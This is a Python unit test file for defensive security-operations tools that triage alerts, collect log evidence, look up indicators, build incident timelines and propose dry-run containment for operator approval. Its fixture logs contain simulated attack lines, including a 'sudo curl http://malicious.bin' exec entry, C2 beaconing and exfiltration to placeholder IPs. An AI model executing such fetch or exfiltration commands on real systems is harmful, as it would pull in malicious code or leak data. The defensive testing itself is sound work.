"""
Unit tests for the native SOC investigation tools:
- triage_security_alert
- gather_log_evidence
- lookup_threat_indicators
- compress_security_timeline
- propose_containment_response
"""

import pytest
from src.registry.tools.soc_tools import (
    triage_security_alert,
    gather_log_evidence,
    lookup_threat_indicators,
    compress_security_timeline,
    propose_containment_response,
)


@pytest.mark.asyncio
async def test_triage_security_alert_high_risk():
    alert_raw = (
        "CRITICAL ALERT: Unauthorized SSH brute force attack detected from 198.51.100.44. "
        "Failed logins exceeded 50 attempts in 60 seconds."
    )
    result_str = await triage_security_alert(alert_raw)
    assert "=== [SOC TRIAGE REPORT] ===" in result_str
    assert "Assigned Severity : HIGH" in result_str or "CRITICAL" in result_str
    assert "198.51.100.44" in result_str
    assert "Assessment: High probability of active security incident" in result_str


@pytest.mark.asyncio
async def test_gather_log_evidence_file_and_dir(tmp_path):
    log_dir = tmp_path / "logs"
    log_dir.mkdir()
    sample_log = log_dir / "auth.log"
    sample_log.write_text(
        "Sep 17 12:00:01 host sshd[1234]: Failed password for root from 198.51.100.44 port 4321 ssh2\n"
        "Sep 17 12:00:05 host sshd[1234]: Accepted password for admin from 10.0.0.5 port 5432 ssh2\n",
        encoding="utf-8",
    )

    res_str = await gather_log_evidence(str(log_dir), pattern="*.log")
    assert "=== [EVIDENCE COLLECTION:" in res_str
    assert "auth.log" in res_str
    assert "Total Artifacts Analyzed: 1 files" in res_str
    assert "Failed password" in res_str


@pytest.mark.asyncio
async def test_lookup_threat_indicators():
    res_pub = await lookup_threat_indicators("198.51.100.44")
    assert "=== [THREAT DISCOVERY: 198.51.100.44] ===" in res_pub
    assert "Type: IP" in res_pub
    assert "Public WAN Address" in res_pub
    assert "Suspected External C2" in res_pub

    res_priv = await lookup_threat_indicators("10.0.0.1")
    assert "RFC 1918 Private Internal Address" in res_priv
    assert "Risk Level: LOW" in res_priv

    res_hash = await lookup_threat_indicators("44d88612fea8a8f36de82e1278abb02f")
    assert "Type: HASH" in res_hash
    assert "Potential malicious binary" in res_hash


@pytest.mark.asyncio
async def test_compress_security_timeline():
    raw_logs = (
        "2026-09-17T12:00:01 host sshd: Failed password for root from 198.51.100.44\n"
        "2026-09-17T12:05:00 host sshd: Accepted password for user deploy\n"
        "2026-09-17T12:06:30 host auditd: Critical exec sudo curl http://malicious.bin\n"
    )
    res_str = await compress_security_timeline(raw_logs, max_timeline_events=5)
    assert "=== [COMPRESSED INCIDENT TIMELINE] ===" in res_str
    assert "Step 01:" in res_str
    assert "Step 02:" in res_str
    assert "Condensed timeline isolated threat sequence" in res_str


@pytest.mark.asyncio
async def test_propose_containment_response():
    res_str = await propose_containment_response(
        target_entity="198.51.100.44",
        action_type="block_ip",
        justification="Active SSH brute force and C2 egress",
        dry_run=True,
    )
    assert "=== [INCIDENT CONTAINMENT PLAN]" in res_str
    assert "Target Entity  : 198.51.100.44" in res_str
    assert "Action Type    : BLOCK_IP" in res_str
    assert "iptables" in res_str
    assert "Ready for operator approval" in res_str


@pytest.mark.asyncio
async def test_analyze_incident_impact():
    from src.registry.tools.soc_tools import analyze_incident_impact

    impact_report = await analyze_incident_impact("Compromised domain admin credentials on WKSTN-FIN-04")
    assert "=== [ENTERPRISE BLAST RADIUS & IMPACT ASSESSMENT REPORT] ===" in impact_report
    assert "WKSTN-FIN-04" in impact_report
    assert "DC01" in impact_report
    assert "da_admin" in impact_report
    assert "svc_backup_admin" in impact_report
    assert "452.8 MB" in impact_report


@pytest.mark.asyncio
async def test_compress_security_timeline_chronological_sorting():
    # Test with out-of-order timestamps: 10:25 -> 10:14 -> 10:32 -> 10:16
    raw_logs = (
        "[2026-09-14T10:25:00Z] Outbound C2 beaconing to 185.220.101.45:8443\n"
        "[2026-09-14T10:14:02Z] Spear-phishing email delivered with Invoice_90214.docm\n"
        "[2026-09-14T10:32:45Z] High-speed bulk exfiltration to 198.51.100.240:443\n"
        "[2026-09-14T10:16:32Z] Obfuscated PowerShell cradle spawned from WINWORD.EXE\n"
    )
    res_str = await compress_security_timeline(raw_logs, max_timeline_events=5)
    assert "=== [COMPRESSED INCIDENT TIMELINE] ===" in res_str
    lines = [l for l in res_str.splitlines() if "Phase" in l]
    # Verify strict ascending order
    assert "10:14:02" in lines[0]
    assert "10:16:32" in lines[1]
    assert "10:25:00" in lines[2]
    assert "10:32:45" in lines[3]


@pytest.mark.asyncio
async def test_path_healing_and_benchmark_sample(tmp_path):
    from src.core.path_utils import resolve_target_path

    # Simulate AST escaped path with \a (0x07) and \r (0x0d)
    mangled_path = "D:\\Security-logs-test\x07ttack-cases-benchmark\\case-1-apt-enterprise-intrusion\raw-logs"
    healed = resolve_target_path(mangled_path)
    assert "\x07" not in str(healed)
    assert "\r" not in str(healed)
    assert "attack-cases-benchmark" in str(healed)
    assert "raw-logs" in str(healed)
